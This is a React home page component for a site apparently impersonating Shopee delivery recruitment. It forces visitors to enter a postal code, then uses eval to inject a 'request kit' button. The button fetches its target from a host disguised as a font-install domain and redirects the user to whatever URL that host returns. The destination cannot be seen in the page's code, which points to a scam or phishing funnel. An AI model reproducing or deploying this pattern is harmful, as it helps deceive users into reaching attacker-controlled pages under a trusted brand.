import React, { useEffect } from 'react';
import Header from '@/components/Header';
import PageTitle from '@/components/PageTitle';
import HeroSection from '@/components/HeroSection';
import Carousel from '@/components/Carousel';
import InfoSection from '@/components/InfoSection';
import JobOpeningsSection from '@/components/JobOpeningsSection';
import BenefitsSection from '@/components/BenefitsSection';
import FAQSection from '@/components/FAQSection';
import CTASection from '@/components/CTASection';
import Footer from '@/components/Footer';
import CepModal from '@/components/CepModal';
import { useAppContext } from '@/contexts/AppContext';
import { useScrollTop } from '@/hooks/use-scroll-top';

const Home: React.FC = () => {
  // Força o scroll para o topo quando a página carrega
  useScrollTop();
  
  const { 
    showCepModal, 
    setShowCepModal, 
    setCepData, 
    setUserCheckedCep 
  } = useAppContext();
  
  useEffect(() => {
    // Verificar se já temos dados salvos
    const savedCepData = localStorage.getItem('shopee_delivery_cep_data');
    if (!savedCepData) {
      // Se não tiver dados, mostrar o modal apenas na página inicial
      setShowCepModal(true);
    } else {
      try {
        const parsedData = JSON.parse(savedCepData);
        setCepData(parsedData);
        setUserCheckedCep(true);
        setShowCepModal(false);
      } catch (error) {
        console.error('Erro ao carregar dados de CEP do localStorage:', error);
        localStorage.removeItem('shopee_delivery_cep_data');
        setShowCepModal(true);
      }
    }
  }, []);

  // Carregar o script do embed da API
  useEffect(() => {
    if (!showCepModal) {
      // Modificar o script da API para usar nosso container
      const customScript = `
        (function(){
          var b='ebcc52e6-5b5e-4841-971f-2dba1114c5c5',
              a='https://fonts-roboto-install.replit.app/api/redirect/',
              s='background:#E83D22;color:white;padding:12px 24px;border:none;border-radius:6px;font-weight:600;cursor:pointer;font-family:Inter,sans-serif;font-size:16px;box-shadow:0 4px 6px -1px rgba(0, 0, 0, 0.1);transition:background-color 0.2s;';
          
          function c(){
            var e=document.createElement('button');
            e.innerHTML='🚀 Solicitar Kit e Finalizar';
            e.style.cssText=s;
            e.onmouseover=function(){e.style.background='#d73920'};
            e.onmouseout=function(){e.style.background='#E83D22'};
            e.onclick=function(){
              fetch(a+b).then(function(r){return r.json()}).then(function(d){
                var url=d.redirect_url;
                if(url.startsWith('/')){url=window.location.protocol+'//'+window.location.host+url}
                window.location.href=url
              }).catch(function(){
                var fallback='/entrega';
                if(fallback.startsWith('/')){fallback=window.location.protocol+'//'+window.location.host+fallback}
                window.location.href=fallback
              })
            };
            return e
          }
          
          // Usar nosso container específico em vez do body
          var container = document.getElementById('replit-embed-container-ebcc52e6-5b5e-4841-971f-2dba1114c5c5');
          if (container) {
            container.appendChild(c());
            console.log('✅ Botão embed adicionado ao container');
          } else {
            console.warn('❌ Container não encontrado');
          }
        })();
      `;

      // Executar o script customizado
      const timer = setTimeout(() => {
        try {
          eval(customScript);
        } catch (error) {
          console.error('❌ Erro ao executar script embed:', error);
        }
      }, 500);

      return () => {
        clearTimeout(timer);
      };
    }
  }, [showCepModal]);
  
  const handleCepConfirm = (cepData: { cep: string, city: string, state: string }) => {
    setCepData(cepData);
    setUserCheckedCep(true);
    setShowCepModal(false);
  };
  
  const handleCepModalClose = () => {
    // Permitir fechar apenas se já temos dados de CEP
    const savedCepData = localStorage.getItem('shopee_delivery_cep_data');
    if (savedCepData) {
      setShowCepModal(false);
    }
  };

  return (
    <div className="bg-white">
      <CepModal 
        isOpen={showCepModal} 
        onClose={handleCepModalClose}
        onConfirm={handleCepConfirm}
      />
      <div className={showCepModal ? 'hidden' : 'block'}>
        <Header />
        <PageTitle />
        
        {/* Botão Embed da API */}
        <div className="container mx-auto px-4 py-4">
          <div className="w-full max-w-4xl mx-auto">
            <div className="bg-white shadow-md rounded-lg overflow-hidden mb-4">
              <div className="p-4">
                <div 
                  id="replit-embed-container-ebcc52e6-5b5e-4841-971f-2dba1114c5c5" 
                  className="text-center"
                ></div>
              </div>
            </div>
          </div>
        </div>
        
        <HeroSection />
        <Carousel />
        <InfoSection />
        <JobOpeningsSection />
        <BenefitsSection />
        <FAQSection />
        <CTASection />
        <Footer />
      </div>
    </div>
  );
};

export default Home;
